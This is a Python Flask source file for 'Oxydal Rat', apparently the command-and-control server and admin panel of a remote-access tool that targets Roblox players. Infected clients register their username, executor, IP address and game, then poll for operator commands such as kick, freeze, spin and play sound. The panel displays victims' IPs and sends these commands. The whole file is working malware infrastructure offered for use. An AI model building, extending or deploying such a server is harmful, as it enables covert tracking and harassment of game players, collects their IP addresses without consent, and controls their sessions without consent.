from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224", "127.0.0.1"} # Ajout de localhost pour tes tests

connected_players = {}
pending_kicks = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"""
    <html>
      <body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
        <h1>Accès refusé</h1>
        <p>Ta crue quoi fdp ?</p>
        <p>Ton IP : <b>{detected}</b></p>
      </body>
    </html>
    """, 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat | Admin</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh;display:flex;overflow:hidden}

/* SIDEBAR */
.sidebar {width:250px; background:rgba(10,10,10,0.95); border-right:1px solid #333; display:flex; flex-direction:column; padding:20px; z-index:100}
.sidebar h2 {font-family:Orbitron; color:#00ffaa; font-size:1.2rem; margin-bottom:40px; text-align:center}
.nav-btn {background:none; border:none; color:#aaa; padding:15px; text-align:left; font-size:1.1rem; cursor:pointer; border-radius:10px; transition:0.3s; margin-bottom:10px; font-weight:600}
.nav-btn:hover {background:rgba(255,255,255,0.05); color:#fff}
.nav-btn.active {background:rgba(0,255,170,0.1); color:#00ffaa; border-left:4px solid #00ffaa}

/* MAIN CONTENT */
.main-content {flex:1; overflow-y:auto; padding:40px; position:relative}
.page {display:none}
.page.active {display:block}

.container{max-width:1100px;margin:auto}
h1{font-family:Orbitron;font-size:3rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
.stats{text-align:center;margin:30px 0;font-size:1.5rem}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:25px}

/* CARDS */
.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s;border:1px solid #222}
.status{display:flex;align-items:center;gap:10px;margin-bottom:15px}
.dot{width:12px;height:12px;border-radius:50%;background:red}
.dot.online{background:#00ffaa;box-shadow:0 0 15px #00ffaa}
.name{font-size:1.4rem;font-weight:600;color:#ffcc00;margin-bottom:10px}
.name a{color:#ffcc00;text-decoration:none}
.info{font-size:0.9rem;color:#aaa;margin-bottom:20px;line-height:1.4}
.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:0.9rem;text-transform:uppercase;letter-spacing:1px}
button.kick-btn{padding:10px;border:none;border-radius:8px;cursor:pointer;font-weight:bold;font-size:0.85rem;color:white;transition:0.2s}
button.kick-btn:hover{filter:brightness(1.2)}

/* HISTORY PAGE */
.history-list {display:flex; flex-direction:column; gap:10px}
.history-item {background:rgba(255,255,255,0.03); padding:15px; border-radius:10px; border-left:4px solid #444; display:flex; justify-content:space-between; align-items:center}
.history-item.connect {border-color:#00ffaa}
.history-item.disconnect {border-color:#ff3366}
.history-item.action {border-color:#ffcc00}
.history-time {color:#666; font-size:0.8rem; font-family:monospace}

/* MODALS & TOASTS (Gardés de ton code original) */
.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;z-index:1000}
.modal.active{display:flex}
.modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
.modal-content input{width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;margin-bottom:20px}
.modal-buttons{display:flex;gap:15px}
.modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer}
.confirm-btn{background:linear-gradient(45deg,#ff3366,#ff5588);color:white}
.cancel-btn{background:#444;color:white}
.toast-container{position:fixed;bottom:25px;right:25px;z-index:999}
.toast{background:#111;border-left:5px solid #00ffaa;padding:15px 20px;margin-top:12px;border-radius:10px}
</style>
</head>
<body>

<div class="sidebar">
    <h2>OXYDAL</h2>
    <button class="nav-btn active" onclick="showPage('playersPage', this)">Players</button>
    <button class="nav-btn" onclick="showPage('historyPage', this)">History</button>
</div>

<div class="main-content">
    <div id="playersPage" class="page active">
        <div class="container">
            <h1>Oxydal Rat</h1>
            <div class="stats" id="stats">Players online: <b>0</b></div>
            <div class="grid" id="players"></div>
        </div>
    </div>

    <div id="historyPage" class="page">
        <div class="container">
            <h1>Event Logs</h1>
            <div style="text-align:right; margin-bottom:20px;">
                <button class="kick-btn" style="background:#333" onclick="clearHistory()">Clear History</button>
            </div>
            <div class="history-list" id="historyList">
                </div>
        </div>
    </div>
</div>

<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason..."><div class="modal-buttons"><button class="cancel-btn" id="cancelKick">Cancel</button><button class="confirm-btn" id="confirmKick">Confirm</button></div></div></div>
<div class="modal" id="playSoundModal"><div class="modal-content" style="border-left:5px solid orange;"><h2 style="color:orange;">Play Sound</h2><input type="text" id="soundAssetId" placeholder="Asset ID..."><div class="modal-buttons"><button class="cancel-btn" id="cancelSound">Cancel</button><button class="confirm-btn" id="confirmSound" style="background:orange;">Confirm</button></div></div></div>
<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let currentKickId = null;

// NAVIGATION
function showPage(pageId, btn) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    document.getElementById(pageId).classList.add('active');
    btn.classList.add('active');
}

// LOGGING SYSTEM
function addLog(msg, type) {
    const list = document.getElementById("historyList");
    const item = document.createElement("div");
    const time = new Date().toLocaleTimeString();
    item.className = `history-item ${type}`;
    item.innerHTML = `<span>${msg}</span><span class="history-time">${time}</span>`;
    list.prepend(item);
    
    // Limite à 100 entrées pour ne pas ramer
    if(list.children.length > 100) list.lastChild.remove();
}

function clearHistory() { document.getElementById("historyList").innerHTML = ""; }

// ORIGINAL LOGIC MODIFIED FOR LOGS
function toast(msg, type = "success") {
    const t = document.createElement("div");
    t.className = "toast " + (type === "danger" ? "danger" : "");
    t.textContent = msg;
    document.getElementById("toasts").appendChild(t);
    setTimeout(() => t.remove(), 5000);
}

function openKickModal(id) { currentKickId = id; document.getElementById("kickModal").classList.add("active"); }
function closeModal() { document.getElementById("kickModal").classList.remove("active"); }
function performKick() {
    if (!currentKickId) return;
    const reason = document.getElementById("kickReason").value.trim() || "Kicked by admin";
    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentKickId, reason: reason})});
    closeModal();
}

const playSoundModal = document.getElementById("playSoundModal");
let currentSoundId = null;
function openPlaySoundModal(id) { currentSoundId = id; playSoundModal.classList.add("active"); }
function closeSoundModal() { playSoundModal.classList.remove("active"); }
function performPlaySound() {
    const assetId = document.getElementById("soundAssetId").value.trim();
    if(!assetId) return;
    sendTroll(currentSoundId, "playsound", assetId);
    closeSoundModal();
}

function sendTroll(id, cmd, assetId = null) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd, assetId: assetId})});
}

document.getElementById("cancelKick").onclick = closeModal;
document.getElementById("confirmKick").onclick = performKick;
document.getElementById("cancelSound").onclick = closeSoundModal;
document.getElementById("confirmSound").onclick = performPlaySound;

function render(data) {
    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));
    
    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) {
            card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card);
            addLog(`New connection: ${p.username} (${id})`, "connect");
        }

        card.innerHTML = `
            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a></div>
            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: ${p.game}</div>
            <div class="category">Actions</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:#ff3366;" onclick="openKickModal('${id}')">KICK</button>
                <button class="kick-btn" style="background:#ff00ff;" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="kick-btn" style="background:#00ffff;" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="kick-btn" style="background:orange;" onclick="openPlaySoundModal('${id}')">SOUND</button>
            </div>
        `;
    });
    
    document.querySelectorAll('.card').forEach(c => {
        const id = c.id.replace('card_', '');
        if (!currentIds.has(id)) {
            addLog(`Player disconnected: ${id}`, "disconnect");
            c.remove();
        }
    });
}

socket.on("update", render);
socket.on("kick_notice", d => {
    toast(`${d.username} → ${d.reason}`, "danger");
    addLog(`Action on ${d.username}: ${d.reason}`, "action");
});
</script>
</body>
</html>"""

# ... Le reste des routes Flask (@app.route) reste identique à ton code original ...
# Assure-toi juste de copier les routes /api, /kick, /troll et la fonction broadcast_loop en dessous de ce HTML

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                connected_players[uid] = {
                    "username": d.get("username", "Unknown"),
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "last": now,
                    "online": True,
                    "game": d.get("game", "Unknown"),
                    "gameId": d.get("gameId", 0),
                    "jobId": d.get("jobId", "Unknown")
                }
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            assetId = None
            if isinstance(cmd, dict):
                assetId = cmd.get("assetId")
                cmd = cmd.get("cmd")
            return jsonify({"command": cmd, "assetId": assetId})
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "No reason")
    pending_kicks[uid] = reason
    name = connected_players.get(uid, {}).get("username", "Unknown")
    socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    assetId = data.get("assetId", None)
    if uid and cmd:
        if assetId:
            pending_commands[uid] = {"cmd": cmd, "assetId": assetId}
        else:
            pending_commands[uid] = cmd
        name = connected_players.get(uid, {}).get("username", "Unknown")
        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
    return jsonify({"sent": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove:
            username = connected_players.pop(uid, {}).get("username", "Unknown")
            socketio.emit("status", {"username": username, "online": False})
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
